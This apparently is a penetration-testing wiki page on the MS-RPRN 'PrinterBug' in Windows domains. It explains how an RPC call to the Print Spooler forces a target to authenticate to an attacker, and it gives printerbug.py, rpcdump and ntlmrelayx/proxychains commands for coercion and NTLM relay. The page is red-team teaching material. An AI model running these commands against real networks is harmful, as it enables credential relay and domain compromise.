# MS-RPRN abuse (PrinterBug)

## Theory

Microsoft’s Print Spooler is a service handling the print jobs and other various tasks related to printing. An attacker controling a domain user/computer can, with a specific RPC call, trigger the spooler service of a target running it and make it authenticate to a target of the attacker's choosing. This flaw is a "won't fix" and enabled by default on all Windows environments ([more info on the finding](https://fr.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory/47)).

**The coerced authentications are made over SMB**. But MS-RPRN abuse can be combined with [WebClient abuse](webclient.md) to elicit incoming authentications made over HTTP which heightens [NTLM relay](../ntlm/relay.md) capabilities.

The "specific call" mentioned above is the `RpcRemoteFindFirstPrinterChangeNotificationEx` notification method, which is part of the MS-RPRN protocol. MS-RPRN is Microsoft’s Print System Remote Protocol. It defines the communication of print job processing and print system management between a print client and a print server.

{% hint style="info" %}
The attacker needs a foothold on the domain (i.e. compromised account) for this attack to work since the coercion is operated through an RPC call in the SMB `\pipe\spoolss` named pipe through the `IPC$` share.
{% endhint %}

## Practice

Remotely checking if the spooler is available can be done with [SpoolerScanner](https://github.com/vletoux/SpoolerScanner) (Powershell) or with [rpcdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py) (Python).

The spooler service can be triggered with [printerbug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) or [SpoolSample](https://github.com/leechristensen/SpoolSample) (C#). There are many alternatives available publicly on the Internet.

{% tabs %}
{% tab title="printerbug" %}
Trigger the spooler service

```bash
printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER HOST'
```
{% endtab %}

{% tab title="rpcdump" %}
Check if the spooler service is available

```bash
rpcdump.py $TARGET | grep -A 6 "spoolsv"
```
{% endtab %}

{% tab title="SpoolerScanner" %}
Check if the spooler service is available

```
```
{% endtab %}

{% tab title="ntlmrelayx" %}
In the situation where the tester doesn't have any credentials, it is still possible to [relay an authentication](../ntlm/relay.md) and trigger the spooler service of a target via a SOCKS proxy.

```bash
ntlmrelayx.py -t smb://$TARGET -socks
proxychains printerbug.py -no-pass 'DOMAIN'/'USER'@'TARGET' 'ATTACKER HOST'
```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
**Nota bene**: coerced NTLM authentications made over SMB restrict the possibilites of [NTLM relay](../ntlm/relay.md). For instance, an "unsigning cross-protocols relay attack" from SMB to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166.
{% endhint %}

## Resources

{% embed url="https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/" %}

